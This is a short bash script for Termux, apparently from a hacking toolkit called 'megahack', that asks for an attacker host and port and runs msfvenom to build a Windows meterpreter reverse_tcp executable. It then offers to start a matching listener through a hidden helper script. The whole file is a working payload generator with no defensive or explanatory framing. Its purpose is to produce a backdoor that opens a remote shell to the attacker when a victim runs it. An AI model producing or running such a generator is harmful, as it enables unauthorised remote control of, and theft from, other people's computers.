#!/data/data/com.termux/files/usr/bin/bash
clear
figlet  WINDOWS | lolcat -t
figlet  PAYLOAD | lolcat -t
figlet GENERATOR | lolcat -t
echo " "
tput setaf 1; echo " LHOST "
read lhost
tput setaf 2; echo " LPORT "
read lport
tput setaf 3; echo "OUTPUT PATH"
read out
msfvenom -p windows/meterpreter/reverse_tcp lhost="$lhost" lport="$lport" -f exe > $HOME/megahack/windows/"$out".exe && tput setaf 4; echo " PAYLOAD GENERATED SUCCESSFULLY"
tput setaf 5; echo "START LISTNER NOW n/y"
read nul
if [ "y" = "$nul" ]
then
	cd $HOME/megahack/.l/.windows && bash .1.sh
else
	exit
fi
